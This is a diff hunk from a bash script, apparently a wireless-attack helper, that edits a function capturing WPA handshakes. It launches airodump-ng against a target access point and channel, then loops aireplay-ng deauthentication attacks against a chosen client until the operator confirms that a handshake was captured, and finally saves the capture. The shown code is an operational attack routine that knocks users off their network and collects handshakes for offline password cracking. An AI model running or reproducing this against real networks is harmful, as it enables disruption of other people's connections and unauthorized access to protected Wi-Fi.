@@ -100,33 +100,27 @@ fcap()
 			CHAN="${CHAN:1}"
 	done
 	sleep 0.5
-	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME --output-format pcap&
+	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME --output-format=pcap&
 	clear
 	echo
-	$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE";$COLOR 9;$COLOR2 9
-	echo
-	$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
-	sleep 3
-	while [ true ]
+	DONE=""
+	while [ $DONE -z ] 2> /dev/null
 		do
 			clear
-			$COLOR 2;echo " [*] You should see ";$COLOR 9
-			echo " [ WPA handshake: $BSSID "
-			$COLOR 2;echo " [^] in the airodump window if successful [^]";$COLOR 9
+			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE";$COLOR 9;$COLOR2 9
+			echo
+			$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
+			sleep 3
 			echo
 			$COLOR 4;read -p " [>] was the hanshake successfully captured? [Y/n]: " WASCAP;$COLOR 9
-			if [ $WASCAP = "n" ] 2> /dev/null
-				then
-					clear
-					$COLOR 1; echo " [*] DEAUTHING $CLIE";$COLOR 9
-					echo
-					$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
-					sleep 3
-				else
-					killall airodump-ng
-					break
-			fi
+				case $WASCAP in
+					"Y")DONE="1";;
+					"y")DONE="1";;
+					"")DONE="1"
+				esac
 		done
+
+	killall airodump-ng
 	echo
 	$COLOR 4;echo "[*] Saving and Stripping capture, please wait... [*]"
 	echo
